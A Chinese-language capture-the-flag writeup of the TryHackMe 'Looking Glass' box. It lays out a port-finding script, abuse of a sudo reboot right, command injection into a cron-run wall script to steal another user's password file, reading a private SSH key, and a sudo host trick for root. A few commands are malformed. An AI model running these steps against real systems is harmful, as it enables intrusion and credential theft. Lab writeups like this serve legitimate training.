---
title: TryHackMe Looking Glass writeup
contest: TryHackMe
year: 2020
difficulty: medium
vuln_type: misc_unknown
tags: [tryhackme, ssh-port-brute, binary-search-jabberwock, sudo-reboot-privesc, alice-sudo-other-host, alice-ssh-id-rsa]
attack_chain:
- nmap -A -p- 5000 端口 SSH 服务 (9000-13999)
- 二分 ssh 爆破 13547 端口
- Jabberwocky 诗: 'PatientlyCountTumblingHowever'
- ssh jabberwock@13547 登录
- sudo -l 看到 /sbin/reboot 无密码
- cat /etc/crontab 看到 @reboot tweedledum bash /home/jabberwock/twasBrillig.sh
- twasBrillig.sh 内容：wall $(cat /home/tweedledum/poem.txt)
- sudo reboot → reboot 后 wall 触发
- 注入 wall $(cat /home/tweedledum/humptydumpty.txt > /home/jabberwock/humptydumpty.txt)
- 获得 humptydumpty 密码 (the password is ***************)
- su humptydumpty 切换
- ls -l /home/alice → drwx--x--x 6 alice alice
- cat /home/alice/.ssh/id_rsa 读 SSH 私钥
- ssh -i id_rsa alice@10.10.225.183
- /etc/sudoers.d/alice: alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
- sudo -h ssalg-gnikool /bin/bash (host 部分)
- 获取 root
key_payload: wall $(cat /home/tweedledum/poem.txt)  # 注入点
one_liner: TryHackMe Looking Glass：5000 SSH 端口二分爆破 + Jabberwocky 诗 + sudo reboot 提权到 humptydumpty + alice SSH 私钥 + host sudo 越权。
lesson: 真实 Linux box 中 wall 命令注入是经典 sudo reboot 提权路径；sudo -h host NOPASSWD 越权也常被忽视。
quality: medium
---
# TryHackMe Looking Glass writeup

## 1. 端口扫描 + 二分爆破
```bash
$ nmap -A -p- -sV 10.10.116.245
# 5000 个 SSH 端口 (9000-13999)
# 二分爆破真实端口
import subprocess
curr_port = (9000 + 13999) // 2
while True:
    output = subprocess.check_output('ssh -q -oStrictHostKeyChecking=no ' + host + ' -p ' + str(curr_port), shell=True)
    if output.strip() == b'Lower': min_port = curr_port
    elif output.strip() == b'Higher': max_port = curr_port
    else:
        print('port:', curr_port)
        break
    curr_port = (curr_port + max_port) // 2  # 或 (curr_port + min_port) // 2
# port: 13547
```

## 2. Jabberwocky 诗 + SSH 登录
```
'PatientlyCountTumblingHowever'
```
ssh jabberwock@13547 登录

## 3. Sudo reboot 提权
```bash
jabberwock@looking-glass:~$ sudo -l
# (root) NOPASSWD: /sbin/reboot

# /etc/crontab
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh

# twasBrillig.sh
wall $(cat /home/tweedledum/poem.txt)
```

## 4. wall 命令注入
```bash
# 改写 twasBrillig.sh
wall $(cat /home/tweedledum/humptydumpty.txt > /home/jabberwock/humptydumpty.txt; cat /home/tweedledum/poem.txt > /home/jabberwock/tweedledum_poem.txt)
# sudo reboot
# 触发 wall → 拿到 humptydumpty 密码
```

## 5. su humptydumpty
```
the password is ***************
```
su humptydumpty 登录

## 6. 读 alice SSH 私钥
```bash
humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
# 私钥可读 (drwx--x--x 6 alice alice)
# cp 私钥到本机
$ ssh -i .ssh/id_rsa alice@10.10.225.183
```

## 7. Sudo -h host 越权
```bash
alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

# host 部分可任意指定
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
# root@looking-glass:~#
```

## 关键洞察
- 5000 个 SSH 端口 (Dropbear sshd) → 二分定位真实服务
- Jabberwocky 诗作为密码
- wall 命令注入绕过 sudo reboot 提权链
- alice SSH 私钥泄露 (drwx--x--x 权限)
- sudo -h host NOPASSWD 是真实漏洞
